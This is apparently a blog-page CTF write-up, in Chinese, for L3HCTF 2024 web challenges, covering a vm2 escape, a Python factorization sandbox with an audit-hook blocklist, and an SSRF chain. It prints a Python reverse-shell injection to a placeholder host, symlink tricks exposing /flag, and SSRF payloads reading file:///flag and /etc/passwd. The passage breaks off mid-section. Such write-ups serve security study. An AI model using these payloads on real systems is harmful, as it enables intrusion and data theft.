@@ -1,0 +1,1029 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Zer0peach">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="L3HCTF战队前几场发挥不错，师傅们还想冲刺一下final，但是这次成绩不太理想，不知道还有没有机会 Volcano web 3&#x2F;4   但很遗憾，我爆零了（看到第一题就没什么心情看了） 就出了一个babySPN。。。密码真签到题 escape-webjs执行页面，输入一些错误的会发现是vm2模块 然后能找到 https:&#x2F;&#x2F;gist.github.com&#x2F;leesh3288&#x2F;f693">
+<meta property="og:type" content="article">
+<meta property="og:title" content="L3HCTF-WEB">
+<meta property="og:url" content="https://zer0peach.github.io/2024/02/06/L3HCTF-WEB/index.html">
+<meta property="og:site_name" content="Zer0peach can&#39;t think">
+<meta property="og:description" content="L3HCTF战队前几场发挥不错，师傅们还想冲刺一下final，但是这次成绩不太理想，不知道还有没有机会 Volcano web 3&#x2F;4   但很遗憾，我爆零了（看到第一题就没什么心情看了） 就出了一个babySPN。。。密码真签到题 escape-webjs执行页面，输入一些错误的会发现是vm2模块 然后能找到 https:&#x2F;&#x2F;gist.github.com&#x2F;leesh3288&#x2F;f693">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://zer0peach.github.io/images/L3HCTF-WEB/image-20240204224527879.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/L3HCTF-WEB/image-20240208164001958.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/L3HCTF-WEB/image-20240207005941893.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/L3HCTF-WEB/image-20240207010002305.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/L3HCTF-WEB/image-20240207010111334.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/L3HCTF-WEB/image-20240207011439092.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/L3HCTF-WEB/image-20240207175837634.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/L3HCTF-WEB/image-20240205033618821.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/L3HCTF-WEB/image-20240205033630269.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/L3HCTF-WEB/image-20240205033654647.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/L3HCTF-WEB/image-20240205033618821.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/L3HCTF-WEB/image-20240205033630269.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/L3HCTF-WEB/image-20240207015100547.png">
+<meta property="article:published_time" content="2024-02-06T15:02:32.000Z">
+<meta property="article:modified_time" content="2024-02-09T10:20:35.997Z">
+<meta property="article:author" content="Zer0peach">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://zer0peach.github.io/images/L3HCTF-WEB/image-20240204224527879.png">
+  
+  
+  
+  <title>L3HCTF-WEB - Zer0peach can&#39;t think</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"zer0peach.github.io","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Zer0peach&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="L3HCTF-WEB"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-02-06 23:02" pubdate>
+          2024年2月6日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          14k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          119 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">L3HCTF-WEB</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="L3HCTF"><a href="#L3HCTF" class="headerlink" title="L3HCTF"></a>L3HCTF</h1><p>战队前几场发挥不错，师傅们还想冲刺一下final，但是这次成绩不太理想，不知道还有没有机会</p>
+<p>Volcano web 3&#x2F;4   但很遗憾，我爆零了（看到第一题就没什么心情看了）</p>
+<p>就出了一个babySPN。。。密码真签到题</p>
+<h2 id="escape-web"><a href="#escape-web" class="headerlink" title="escape-web"></a>escape-web</h2><p>js执行页面，输入一些错误的会发现是vm2模块</p>
+<p>然后能找到</p>
+<p><a target="_blank" rel="noopener" href="https://gist.github.com/leesh3288/f693061e6523c97274ad5298eb2c74e9">https://gist.github.com/leesh3288/f693061e6523c97274ad5298eb2c74e9</a></p>
+<p>但是我做到这里就不会了，因为没有回显</p>
+<p>队里lyk师傅使用</p>
+<div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">ln</span> -sf /flag /app/error.txt</code></pre></div>
+
+<p>成功回显</p>
+<p><img src="/../images/L3HCTF-WEB/image-20240204224527879.png" srcset="/img/loading.gif" lazyload alt="image-20240204224527879"></p>
+<p>看了其他战队的WP，也都是<code>ln -sf</code></p>
+<p>也可以链接到<code>/app/output.txt</code>文件</p>
+<p>官方说法</p>
+<blockquote>
+<p>ls &gt;&amp;2</p>
+<p>直接cat &#x2F;flag提示No such file or directory，查看进程列表可知跑的是node &#x2F;app&#x2F;dist.js。</p>
+<p>进入&#x2F;app目录，code.js是用户输入的代码，dist.js是打包的程序代码，查看程序代码并没有写文件，猜测error.txt和output.txt是管道重定向产生的文件，挂载在容器内由外部进行读取。</p>
+<p>将output.txt软链接到&#x2F;flag即可读取flag。</p>
+</blockquote>
+<p><img src="/../images/L3HCTF-WEB/image-20240208164001958.png" srcset="/img/loading.gif" lazyload alt="image-20240208164001958"></p>
+<h2 id="intractable-problem"><a href="#intractable-problem" class="headerlink" title="intractable problem"></a>intractable problem</h2><p>各战队WP都是非预期</p>
+<p>给了附件，但是我没看。。</p>
+<p>现在看了一下</p>
+<div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys
+<span class="hljs-keyword">import</span> os
+
+codes=<span class="hljs-string">&#x27;&#x27;&#x27;</span>
+<span class="hljs-string">&lt;&lt;codehere&gt;&gt;</span>
+<span class="hljs-string">&#x27;&#x27;&#x27;</span>
+
+<span class="hljs-keyword">try</span>:
+    codes.encode(<span class="hljs-string">&quot;ascii&quot;</span>)
+<span class="hljs-keyword">except</span> UnicodeEncodeError:
+    exit(<span class="hljs-number">0</span>)
+
+<span class="hljs-keyword">if</span> <span class="hljs-string">&quot;__&quot;</span> <span class="hljs-keyword">in</span> codes:
+    exit(<span class="hljs-number">0</span>)
+
+codes+=<span class="hljs-string">&quot;\nres=factorization(c)&quot;</span>
+<span class="hljs-built_in">locals</span>=&#123;<span class="hljs-string">&quot;c&quot;</span>:<span class="hljs-string">&quot;696287028823439285412516128163589070098246262909373657123513205248504673721763725782111252400832490434679394908376105858691044678021174845791418862932607425950200598200060291023443682438196296552959193310931511695879911797958384622729237086633102190135848913461450985723041407754481986496355123676762688279345454097417867967541742514421793625023908839792826309255544857686826906112897645490957973302912538933557595974247790107119797052793215732276223986103011959886471914076797945807178565638449444649884648281583799341879871243480706581561222485741528460964215341338065078004726721288305399437901175097234518605353898496140160657001466187637392934757378798373716670535613637539637468311719923648905641849133472394335053728987186164141412563575941433170489130760050719104922820370994229626736584948464278494600095254297544697025133049342015490116889359876782318981037912673894441836237479855411354981092887603250217400661295605194527558700876411215998415750392444999450257864683822080257235005982249555861378338228029418186061824474448847008690117195232841650446990696256199968716183007097835159707554255408220292726523159227686505847172535282144212465211879980290126845799443985426297754482370702756554520668240815554441667638597863&quot;</span>,<span class="hljs-string">&quot;__builtins__&quot;</span>: <span class="hljs-literal">None</span>&#125;
+res=<span class="hljs-built_in">set</span>()
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">blackFunc</span>(<span class="hljs-params">oldexit</span>):
+    <span class="hljs-keyword">def</span> <span class="hljs-title function_">func</span>(<span class="hljs-params">event, args</span>):
+        blackList = [<span class="hljs-string">&quot;process&quot;</span>,<span class="hljs-string">&quot;os&quot;</span>,<span class="hljs-string">&quot;sys&quot;</span>,<span class="hljs-string">&quot;interpreter&quot;</span>,<span class="hljs-string">&quot;cpython&quot;</span>,<span class="hljs-string">&quot;open&quot;</span>,<span class="hljs-string">&quot;compile&quot;</span>,<span class="hljs-string">&quot;__new__&quot;</span>,<span class="hljs-string">&quot;gc&quot;</span>]
+        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> blackList:
+            <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> (event + <span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-built_in">str</span>(s) <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> args)).lower():
+                <span class="hljs-built_in">print</span>(i)
+                oldexit(<span class="hljs-number">0</span>)
+    <span class="hljs-keyword">return</span> func
+
+code = <span class="hljs-built_in">compile</span>(codes, <span class="hljs-string">&quot;&lt;judgecode&gt;&quot;</span>, <span class="hljs-string">&quot;exec&quot;</span>)
+sys.addaudithook(blackFunc(os._exit))
+<span class="hljs-built_in">exec</span>(code,&#123;<span class="hljs-string">&quot;__builtins__&quot;</span>: <span class="hljs-literal">None</span>&#125;,<span class="hljs-built_in">locals</span>)
+
+p=<span class="hljs-built_in">int</span>(<span class="hljs-built_in">locals</span>[<span class="hljs-string">&quot;res&quot;</span>][<span class="hljs-number">0</span>])
+q=<span class="hljs-built_in">int</span>(<span class="hljs-built_in">locals</span>[<span class="hljs-string">&quot;res&quot;</span>][<span class="hljs-number">1</span>])
+<span class="hljs-keyword">if</span>(p&gt;<span class="hljs-number">1e5</span> <span class="hljs-keyword">and</span> q&gt;<span class="hljs-number">1e5</span> <span class="hljs-keyword">and</span> p*q==<span class="hljs-built_in">int</span>(<span class="hljs-string">&quot;696287028823439285412516128163589070098246262909373657123513205248504673721763725782111252400832490434679394908376105858691044678021174845791418862932607425950200598200060291023443682438196296552959193310931511695879911797958384622729237086633102190135848913461450985723041407754481986496355123676762688279345454097417867967541742514421793625023908839792826309255544857686826906112897645490957973302912538933557595974247790107119797052793215732276223986103011959886471914076797945807178565638449444649884648281583799341879871243480706581561222485741528460964215341338065078004726721288305399437901175097234518605353898496140160657001466187637392934757378798373716670535613637539637468311719923648905641849133472394335053728987186164141412563575941433170489130760050719104922820370994229626736584948464278494600095254297544697025133049342015490116889359876782318981037912673894441836237479855411354981092887603250217400661295605194527558700876411215998415750392444999450257864683822080257235005982249555861378338228029418186061824474448847008690117195232841650446990696256199968716183007097835159707554255408220292726523159227686505847172535282144212465211879980290126845799443985426297754482370702756554520668240815554441667638597863&quot;</span>)):
+    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Correct!&quot;</span>,end=<span class="hljs-string">&quot;&quot;</span>)
+<span class="hljs-keyword">else</span>:
+    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Wrong!&quot;</span>,end=<span class="hljs-string">&quot;&quot;</span>)</code></pre></div>
+
+<div class="code-wrapper"><pre><code class="hljs livescript"><span class="hljs-keyword">import</span> flask
+<span class="hljs-keyword">import</span> time
+<span class="hljs-keyword">import</span> random
+<span class="hljs-keyword">import</span> os
+<span class="hljs-keyword">import</span> subprocess
+
+codes=<span class="hljs-string">&quot;&quot;</span>
+<span class="hljs-keyword">with</span> open(<span class="hljs-string">&quot;oj.py&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:
+    codes=f.read()
+flag=<span class="hljs-string">&quot;&quot;</span>
+<span class="hljs-keyword">with</span> open(<span class="hljs-string">&quot;/flag&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:
+    flag=f.read()
+app = flask.Flask(__name__)
+
+@app.route(<span class="hljs-string">&#x27;/&#x27;</span>)
+def index():
+    <span class="hljs-keyword">return</span> flask.render_template(<span class="hljs-string">&#x27;ui.html&#x27;</span>)
+
+@app.route(<span class="hljs-string">&#x27;/judge&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>])
+def judge():
+    code = flask.request.json[<span class="hljs-string">&#x27;code&#x27;</span>].replace<span class="hljs-function"><span class="hljs-params">(<span class="hljs-string">&quot;def factorization(n: string) -&gt; tuple[int]:&quot;</span>,<span class="hljs-string">&quot;def factorization(n):&quot;</span>)</span></span>
+<span class="hljs-function">    <span class="hljs-title">correctstr</span> = &#x27;&#x27;.<span class="hljs-title">join</span><span class="hljs-params">(random.sample(<span class="hljs-string">&#x27;zyxwvutsrqponmlkjihgfedcba&#x27;</span>, <span class="hljs-number">20</span>))</span></span>
+<span class="hljs-function">    <span class="hljs-title">wrongstr</span> = &#x27;&#x27;.<span class="hljs-title">join</span><span class="hljs-params">(random.sample(<span class="hljs-string">&#x27;zyxwvutsrqponmlkjihgfedcba&#x27;</span>, <span class="hljs-number">20</span>))</span></span>
+<span class="hljs-function">    <span class="hljs-title">print</span><span class="hljs-params">(correctstr,wrongstr)</span></span>
+<span class="hljs-function">    <span class="hljs-title">code</span>=<span class="hljs-title">codes</span>.<span class="hljs-title">replace</span><span class="hljs-params">(<span class="hljs-string">&quot;Correct&quot;</span>,correctstr)</span>.<span class="hljs-title">replace</span><span class="hljs-params">(<span class="hljs-string">&quot;Wrong&quot;</span>,wrongstr)</span>.<span class="hljs-title">replace</span><span class="hljs-params">(<span class="hljs-string">&quot;&lt;&lt;codehere&gt;&gt;&quot;</span>,code)</span></span>
+<span class="hljs-function"></span>
+<span class="hljs-function">    <span class="hljs-title">filename</span> = &quot;<span class="hljs-title">upload</span>/&quot;+<span class="hljs-title">str</span><span class="hljs-params">(time.time())</span> + <span class="hljs-title">str</span><span class="hljs-params">(random.randint(<span class="hljs-number">0</span>, <span class="hljs-number">1000000</span>))</span></span>
+<span class="hljs-function">    <span class="hljs-title">with</span> <span class="hljs-title">open</span><span class="hljs-params">(filename + <span class="hljs-string">&#x27;.py&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>)</span> <span class="hljs-title">as</span> <span class="hljs-title">f</span>:</span>
+<span class="hljs-function">        <span class="hljs-title">f</span>.<span class="hljs-title">write</span><span class="hljs-params">(code)</span></span>
+<span class="hljs-function"></span>
+<span class="hljs-function">    <span class="hljs-title">try</span>:</span>
+<span class="hljs-function">        <span class="hljs-title">result</span> = <span class="hljs-title">subprocess</span>.<span class="hljs-title">run</span><span class="hljs-params">([<span class="hljs-string">&#x27;python3&#x27;</span>, filename + <span class="hljs-string">&#x27;.py&#x27;</span>], stdout=subprocess.PIPE, timeout=<span class="hljs-number">5</span>)</span>.<span class="hljs-title">stdout</span>.<span class="hljs-title">decode</span><span class="hljs-params">(<span class="hljs-string">&quot;utf-8&quot;</span>)</span></span>
+<span class="hljs-function">        <span class="hljs-title">os</span>.<span class="hljs-title">remove</span><span class="hljs-params">(filename + <span class="hljs-string">&#x27;.py&#x27;</span>)</span></span>
+<span class="hljs-function">        <span class="hljs-title">print</span><span class="hljs-params">(result)</span></span>
+<span class="hljs-function">        <span class="hljs-title">if</span><span class="hljs-params">(result.endswith(correctstr+<span class="hljs-string">&quot;!&quot;</span>))</span>:</span>
+<span class="hljs-function">            <span class="hljs-title">return</span> <span class="hljs-title">flask</span>.<span class="hljs-title">jsonify</span><span class="hljs-params">(<span class="hljs-string">&quot;Correct!flag is &quot;</span>+flag)</span></span>
+<span class="hljs-function">        <span class="hljs-title">else</span>:</span>
+<span class="hljs-function">            <span class="hljs-title">return</span> <span class="hljs-title">flask</span>.<span class="hljs-title">jsonify</span><span class="hljs-params">(<span class="hljs-string">&quot;Wrong!&quot;</span>)</span></span>
+<span class="hljs-function">    <span class="hljs-title">except</span>:</span>
+<span class="hljs-function">        <span class="hljs-title">os</span>.<span class="hljs-title">remove</span><span class="hljs-params">(filename + <span class="hljs-string">&#x27;.py&#x27;</span>)</span></span>
+<span class="hljs-function">        <span class="hljs-title">return</span> <span class="hljs-title">flask</span>.<span class="hljs-title">jsonify</span><span class="hljs-params">(<span class="hljs-string">&quot;Timeout!&quot;</span>)</span></span>
+<span class="hljs-function"></span>
+<span class="hljs-function"><span class="hljs-title">if</span> <span class="hljs-title">__name__</span> == &#x27;<span class="hljs-title">__main__</span>&#x27;:</span>
+<span class="hljs-function">    <span class="hljs-title">app</span>.<span class="hljs-title">run</span><span class="hljs-params">(<span class="hljs-string">&quot;0.0.0.0&quot;</span>)</span></span></code></pre></div>
+
+
+
+<p>把输入的内容替换到codehere中</p>
+<div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys
+<span class="hljs-keyword">import</span> os
+
+codes=<span class="hljs-string">&#x27;&#x27;&#x27;</span>
+<span class="hljs-string">&lt;&lt;codehere&gt;&gt;</span>
+<span class="hljs-string">&#x27;&#x27;&#x27;</span></code></pre></div>
+
+<p>这里可以造成逃逸，确实是非预期</p>
+<p>闭合前面，补全后面</p>
+<div class="code-wrapper"><pre><code class="hljs asciidoc">&#x27;&#x27;&#x27;
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;host&quot;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);                  
+exit(0)                  
+&#x27;&#x27;&#x27;</code></pre></div>
+
+<h2 id="short-url"><a href="#short-url" class="headerlink" title="short-url"></a>short-url</h2><p>unknown 牛B</p>
+<p>其实难度不高，但反正我没看了</p>
+<p><img src="/../images/L3HCTF-WEB/image-20240207005941893.png" srcset="/img/loading.gif" lazyload alt="image-20240207005941893"></p>
+<p><img src="/../images/L3HCTF-WEB/image-20240207010002305.png" srcset="/img/loading.gif" lazyload alt="image-20240207010002305"></p>
+<p><img src="/../images/L3HCTF-WEB/image-20240207010111334.png" srcset="/img/loading.gif" lazyload alt="image-20240207010111334"></p>
+<p>页面只有一个link参数，限定了http协议，尝试输入自己的vps地址，开启监听都没反应</p>
+<p>那应该是个SSRF</p>
+<p>并且不管我们输入什么值，都会返回</p>
+<div class="code-wrapper"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>example.com/jump?redirect=随机字符</code></pre></div>
+
+<p>这些随机字符为键值对里的键，存储着对应的link的值</p>
+<p>看到test路由，</p>
+<p><img src="/../images/L3HCTF-WEB/image-20240207011439092.png" srcset="/img/loading.gif" lazyload alt="image-20240207011439092"></p>
+<p>会获取键值对的值，所以我们应得到一个有效的redirect后传给他</p>
+<p>并且他所存储的link的值中不应该有url参数，</p>
+<p>有也可以，但是有url参数的话，要验证host必须为<code>www.example.com</code></p>
+<p>不然无法通过Fetch函数获取该链接的内容</p>
+<p>private路由限制RemoteAddr为127.0.0.1，才能获取指定url的内容</p>
+<p>那这里也就是说要<code>http://127.0.0.1</code></p>
+<p>这里就可以配合上面的SSRF，再加上private路由可以传一个叫url的参数</p>
+<p>当然这里有个Intercepter，用;或者&#x2F;即可</p>
+<div class="code-wrapper"><pre><code class="hljs gradle"><span class="hljs-regexp">/private 变成 /</span><span class="hljs-keyword">private</span>/ 
+<span class="hljs-regexp">/private 变成 /</span><span class="hljs-keyword">private</span>;</code></pre></div>
+
+<p><img src="/../images/L3HCTF-WEB/image-20240207175837634.png" srcset="/img/loading.gif" lazyload alt="image-20240207175837634"></p>
+<h3 id="给一下解题步骤"><a href="#给一下解题步骤" class="headerlink" title="给一下解题步骤"></a>给一下解题步骤</h3><p>后面根据做法整理一下思路</p>
+<p><img src="/../images/L3HCTF-WEB/image-20240205033618821.png" srcset="/img/loading.gif" lazyload alt="image-20240205033618821"></p>
+<p><img src="/../images/L3HCTF-WEB/image-20240205033630269.png" srcset="/img/loading.gif" lazyload alt="image-20240205033630269"></p>
+<p><img src="/../images/L3HCTF-WEB/image-20240205033654647.png" srcset="/img/loading.gif" lazyload alt="image-20240205033654647"></p>
+<h3 id="整理思路"><a href="#整理思路" class="headerlink" title="整理思路"></a>整理思路</h3><p>首先</p>
+<p><img src="/../images/L3HCTF-WEB/image-20240205033618821.png" srcset="/img/loading.gif" lazyload alt="image-20240205033618821"></p>
+<p>这是没有问题了</p>
+<p>获取到一个键名</p>
+<p>然后通过jump路由作中间人</p>
+<p><img src="/../images/L3HCTF-WEB/image-20240205033630269.png" srcset="/img/loading.gif" lazyload alt="image-20240205033630269"></p>
+<p><img src="/../images/L3HCTF-WEB/image-20240207015100547.png" srcset="/img/loading.gif" lazyload alt="image-20240207015100547"></p>
+<p>根据解题步骤，访问<code>http://ip:port/jump?redirect=随机字符</code>响应的内容是<code>http://127.0.0.1:8080/private;?url=file:///flag</code></p>
+<p>所以test路由检查他的键值为<code>http://ip:port/jump?redirect=获取的新值</code>，并没有url参数</p>
+<p>所以通过Fetch<code>http://ip:port/jump?redirect=获取的新值</code>会重定向到<code>http://127.0.0.1:8080/private;?url=file:///flag</code>由此获取flag</p>
+<p>可能表达不太好，将就着看吧</p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/KHeSnJMUXAc_fV8Jpvg3uA">L3HCTF 2024 - Nep WP (qq.com)</a>意思跟它想表达的差不多</p>
+<h3 id="官方WP"><a href="#官方WP" class="headerlink" title="官方WP"></a>官方WP</h3><p>官方是直接从private到test的，这样的话就要检查参数url的host是否为<code>www.example.com</code></p>
+<p>可以利用<code>org.springframework.web.util.UriComponents</code>拼接多个相同param的特点，将url拆分为两部分</p>
+<div class="code-wrapper"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8080</span><span class="hljs-regexp">/private/</span>?url=file:<span class="hljs-regexp">//</span>www.example.com&amp;url=@/flag</code></pre></div>
+
+<p>得到的redirect传给test即可</p>
+<h3 id="S1uM4i-WP-不太懂"><a href="#S1uM4i-WP-不太懂" class="headerlink" title="S1uM4i WP  不太懂"></a>S1uM4i WP  不太懂</h3><p>也是直接从private到test的</p>
+<div class="code-wrapper"><pre><code class="hljs Plain">http://127.0.0.1:8080/private;?url=file://www.example.com////etc/passwd</code></pre></div>
+
+<p>往协议头里面塞，转到 private 的时候会自动过一层 url 解码，变成 <code>Fetch(&quot;file:///etc/passwd?://www.example.com/&quot;);</code></p>
+<p>payload</p>
+<div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1:8080</span>/private;?url=%<span class="hljs-number">66</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">3</span>a%<span class="hljs-number">2</span>f%<span class="hljs-number">2</span>f%<span class="hljs-number">2</span>f%<span class="hljs-number">66</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">61</span>%<span class="hljs-number">67</span>%<span class="hljs-number">3</span>f://www.example.com/</code></pre></div>
+
+
+
+<h2 id="intractable-problem-revenge"><a href="#intractable-problem-revenge" class="headerlink" title="intractable problem revenge"></a>intractable problem revenge</h2><p>python沙箱懂不了一点</p>
+<p>随便写点笔记吧，然后给出其他战队WP</p>
+<blockquote>
+<p>题目设置了一个python沙箱，禁用了builtins，同时禁止了<code>__</code>从而禁止了通过继承链进行逃逸，还利用python审计事件禁止了通过gc等获取沙箱外对象，同时禁用了sys、os、open等风险功能。</p>
+</blockquote>
+<p>禁用builtins的代码大概是这样</p>
+<div class="code-wrapper"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">eval</span><span class="hljs-params">(code, &#123;<span class="hljs-string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;, &#123;<span class="hljs-string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;)</span></span>
+或
+<span class="hljs-function"><span class="hljs-title">exec</span><span class="hljs-params">(code, &#123;<span class="hljs-string">&quot;__builtins__&quot;</span>: None&#125;)</span></span></code></pre></div>
+
+<p>由于我们使用的函数基本上都在<code>__builtins__</code>中，</p>
